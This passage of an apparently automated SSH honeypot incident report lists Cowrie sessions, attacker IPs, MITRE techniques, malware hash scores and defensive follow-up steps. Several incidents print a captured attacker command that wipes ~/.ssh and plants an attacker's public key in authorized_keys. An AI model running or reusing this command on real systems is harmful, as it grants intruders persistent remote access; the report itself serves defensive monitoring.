| `2026-05-03 04:28:28` | `cowrie.command.input` |
| `2026-05-03 04:28:30` | `cowrie.log.closed` |
| `2026-05-03 04:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a4032fa21ea

| Field | Detail |
|---|---|
| **Source IP** | `103.105.176[.]70` |
| **First Seen** | 2026-05-03 04:47 |
| **Last Seen** | 2026-05-03 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:47:55` | `cowrie.session.connect` |
| `2026-05-03 04:47:55` | `cowrie.client.version` |
| `2026-05-03 04:47:55` | `cowrie.client.kex` |
| `2026-05-03 04:47:55` | `cowrie.login.success` |
| `2026-05-03 04:47:55` | `cowrie.session.params` |
| `2026-05-03 04:47:55` | `cowrie.command.input` |
| `2026-05-03 04:47:55` | `cowrie.command.failed` |
| `2026-05-03 04:47:55` | `cowrie.log.closed` |
| `2026-05-03 04:47:55` | `cowrie.session.params` |
| `2026-05-03 04:47:55` | `cowrie.command.input` |
| `2026-05-03 04:47:55` | `cowrie.session.file_download` |
| `2026-05-03 04:47:55` | `cowrie.log.closed` |
| `2026-05-03 04:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.105.176[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.105.176[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b06cde73820

| Field | Detail |
|---|---|
| **Source IP** | `103.105.176[.]70` |
| **First Seen** | 2026-05-03 04:47 |
| **Last Seen** | 2026-05-03 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:47:56` | `cowrie.session.connect` |
| `2026-05-03 04:47:56` | `cowrie.client.version` |
| `2026-05-03 04:47:56` | `cowrie.client.kex` |
| `2026-05-03 04:47:57` | `cowrie.login.success` |
| `2026-05-03 04:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.105.176[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.105.176[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6de3adf27a81

| Field | Detail |
|---|---|
| **Source IP** | `103.105.176[.]70` |
| **First Seen** | 2026-05-03 04:58 |
| **Last Seen** | 2026-05-03 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:58:57` | `cowrie.session.connect` |
| `2026-05-03 04:58:57` | `cowrie.client.version` |
| `2026-05-03 04:58:57` | `cowrie.client.kex` |
| `2026-05-03 04:58:57` | `cowrie.login.success` |
| `2026-05-03 04:58:57` | `cowrie.session.params` |
| `2026-05-03 04:58:57` | `cowrie.command.input` |
| `2026-05-03 04:58:57` | `cowrie.command.failed` |
| `2026-05-03 04:58:57` | `cowrie.log.closed` |
| `2026-05-03 04:58:57` | `cowrie.session.params` |
| `2026-05-03 04:58:57` | `cowrie.command.input` |
| `2026-05-03 04:58:57` | `cowrie.session.file_download` |
| `2026-05-03 04:58:57` | `cowrie.log.closed` |
| `2026-05-03 04:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.105.176[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.105.176[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618587f05b8e

| Field | Detail |
|---|---|
| **Source IP** | `103.105.176[.]70` |
| **First Seen** | 2026-05-03 04:58 |
| **Last Seen** | 2026-05-03 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:58:59` | `cowrie.session.connect` |
| `2026-05-03 04:58:59` | `cowrie.client.version` |
| `2026-05-03 04:58:59` | `cowrie.client.kex` |
| `2026-05-03 04:58:59` | `cowrie.login.success` |
| `2026-05-03 04:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.105.176[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.105.176[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f0bb241f57

| Field | Detail |
|---|---|
| **Source IP** | `35.240.75[.]51` |
| **First Seen** | 2026-05-03 05:22 |
| **Last Seen** | 2026-05-03 05:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 05:22:44` | `cowrie.session.connect` |
| `2026-05-03 05:22:44` | `cowrie.client.version` |
| `2026-05-03 05:22:45` | `cowrie.client.kex` |
| `2026-05-03 05:22:46` | `cowrie.login.success` |
| `2026-05-03 05:22:46` | `cowrie.session.params` |
| `2026-05-03 05:22:46` | `cowrie.command.input` |
| `2026-05-03 05:22:46` | `cowrie.command.failed` |
| `2026-05-03 05:22:46` | `cowrie.log.closed` |
| `2026-05-03 05:22:47` | `cowrie.session.params` |
| `2026-05-03 05:22:47` | `cowrie.command.input` |
| `2026-05-03 05:22:47` | `cowrie.session.file_download` |
| `2026-05-03 05:22:47` | `cowrie.log.closed` |
| `2026-05-03 05:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.240.75[.]51` to AbuseIPDB if not already reported
- [ ] Block `35.240.75[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b7fa522213

| Field | Detail |
|---|---|
| **Source IP** | `35.240.75[.]51` |
| **First Seen** | 2026-05-03 05:22 |
| **Last Seen** | 2026-05-03 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 05:22:51` | `cowrie.session.connect` |
| `2026-05-03 05:22:51` | `cowrie.client.version` |
| `2026-05-03 05:22:51` | `cowrie.client.kex` |
| `2026-05-03 05:22:52` | `cowrie.login.success` |
| `2026-05-03 05:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.240.75[.]51` to AbuseIPDB if not already reported
- [ ] Block `35.240.75[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beaf2d3bfa94

| Field | Detail |
|---|---|
| **Source IP** | `103.143.11[.]168` |
| **First Seen** | 2026-05-03 05:44 |
| **Last Seen** | 2026-05-03 05:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 05:44:23` | `cowrie.session.connect` |
| `2026-05-03 05:44:23` | `cowrie.client.version` |
| `2026-05-03 05:44:23` | `cowrie.client.kex` |
| `2026-05-03 05:44:24` | `cowrie.login.success` |
| `2026-05-03 05:44:25` | `cowrie.session.params` |
| `2026-05-03 05:44:25` | `cowrie.command.input` |
| `2026-05-03 05:44:25` | `cowrie.command.failed` |
| `2026-05-03 05:44:25` | `cowrie.log.closed` |
| `2026-05-03 05:44:25` | `cowrie.session.params` |
| `2026-05-03 05:44:25` | `cowrie.command.input` |
| `2026-05-03 05:44:26` | `cowrie.session.file_download` |
| `2026-05-03 05:44:26` | `cowrie.log.closed` |
| `2026-05-03 05:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.11[.]168` to AbuseIPDB if not already reported
- [ ] Block `103.143.11[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e91cbed969a

| Field | Detail |
|---|---|
| **Source IP** | `103.143.11[.]168` |
| **First Seen** | 2026-05-03 05:44 |
| **Last Seen** | 2026-05-03 05:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 05:44:29` | `cowrie.session.connect` |
| `2026-05-03 05:44:29` | `cowrie.client.version` |
| `2026-05-03 05:44:29` | `cowrie.client.kex` |
| `2026-05-03 05:44:30` | `cowrie.login.success` |
| `2026-05-03 05:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.11[.]168` to AbuseIPDB if not already reported
- [ ] Block `103.143.11[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d69b27227d3a

| Field | Detail |
|---|---|
| **Source IP** | `41.59.229[.]33` |
| **First Seen** | 2026-05-03 06:06 |
| **Last Seen** | 2026-05-03 06:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 06:06:16` | `cowrie.session.connect` |
| `2026-05-03 06:06:16` | `cowrie.client.version` |
| `2026-05-03 06:06:16` | `cowrie.client.kex` |
| `2026-05-03 06:06:17` | `cowrie.login.success` |
| `2026-05-03 06:06:18` | `cowrie.session.params` |
| `2026-05-03 06:06:18` | `cowrie.command.input` |
| `2026-05-03 06:06:18` | `cowrie.command.failed` |
| `2026-05-03 06:06:18` | `cowrie.log.closed` |
| `2026-05-03 06:06:18` | `cowrie.session.params` |
| `2026-05-03 06:06:18` | `cowrie.command.input` |
| `2026-05-03 06:06:19` | `cowrie.session.file_download` |
| `2026-05-03 06:06:19` | `cowrie.log.closed` |
| `2026-05-03 06:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.59.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `41.59.229[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e3571518b16

| Field | Detail |
|---|---|
| **Source IP** | `41.59.229[.]33` |
| **First Seen** | 2026-05-03 06:06 |
| **Last Seen** | 2026-05-03 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 06:06:22` | `cowrie.session.connect` |
| `2026-05-03 06:06:22` | `cowrie.client.version` |
| `2026-05-03 06:06:23` | `cowrie.client.kex` |
| `2026-05-03 06:06:24` | `cowrie.login.success` |
| `2026-05-03 06:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.59.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `41.59.229[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `207.180.238[.]213` | **64** | 2026-05-03 05:35 | 2026-05-03 05:52 | 33m | 0 | `T1592` | 🟠 MEDIUM |
| `103.163.95[.]99` | **59** | 2026-05-03 03:42 | 2026-05-03 04:41 | 1m | 59 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.14.66[.]236` | **32** | 2026-05-03 04:03 | 2026-05-03 04:03 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.77.204[.]127` | **32** | 2026-05-03 04:42 | 2026-05-03 04:43 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `35.233.124[.]62` | **32** | 2026-05-03 03:37 | 2026-05-03 03:38 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `103.105.176[.]70` | **29** | 2026-05-03 04:35 | 2026-05-03 05:04 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.249.247[.]165` | **29** | 2026-05-03 03:58 | 2026-05-03 04:23 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.78.194[.]186` | **20** | 2026-05-03 03:53 | 2026-05-03 04:41 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `47.247.99[.]155` | **20** | 2026-05-03 03:34 | 2026-05-03 03:54 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `41.59.229[.]33` | **15** | 2026-05-03 05:55 | 2026-05-03 06:27 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.86[.]183` | **13** | 2026-05-03 05:59 | 2026-05-03 06:29 | 22m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `208.92.193[.]123` | **8** | 2026-05-03 03:43 | 2026-05-03 03:45 | 4m | 0 | `T1592` | 🟢 LOW |
| `202.103.55[.]158` | **5** | 2026-05-03 03:34 | 2026-05-03 03:36 | 10m | 0 | `T1592` | 🟢 LOW |
| `107.191.38[.]55` | **3** | 2026-05-03 06:00 | 2026-05-03 06:17 | 1m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-05-03 03:46 | 2026-05-03 03:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.143.11[.]168` | 1 | 2026-05-03 05:44 | 2026-05-03 05:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.118[.]217` | 1 | 2026-05-03 06:04 | 2026-05-03 06:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-05-03 03:39 | 2026-05-03 03:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.30.203[.]91` | 1 | 2026-05-03 04:40 | 2026-05-03 04:40 | 3s | 0 | `T1592` | 🟢 LOW |
| `217.154.106[.]153` | 1 | 2026-05-03 06:28 | 2026-05-03 06:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.240.75[.]51` | 1 | 2026-05-03 05:22 | 2026-05-03 05:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.236.176[.]248` | 1 | 2026-05-03 03:44 | 2026-05-03 03:44 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.77.204[.]127` | BE | Google LLC | **100** ⚠️ | 0 |
| `207.180.238[.]213` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `47.247.99[.]155` | IN | Reliance Jio Infocomm Limited | **100** ⚠️ | 50 |
| `185.30.203[.]91` | UA | Kyiv | **100** ⚠️ | 5 |
| `185.242.226[.]17` | NL | HostUS Solutions LLC | **100** ⚠️ | 50 |
| `14.103.118[.]217` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `45.249.247[.]165` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `202.103.55[.]158` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `41.59.229[.]33` | TZ | TANZANIA TELECOMMUNICATIONS CO. LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 233 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 186 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 36 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |

---

## 🔕 False Positive Summary (882 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 9 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 864 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1286 cases |
| Tool 34  | Credential Extractor        | ✅ 225 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 49 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 882 filtered (68.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
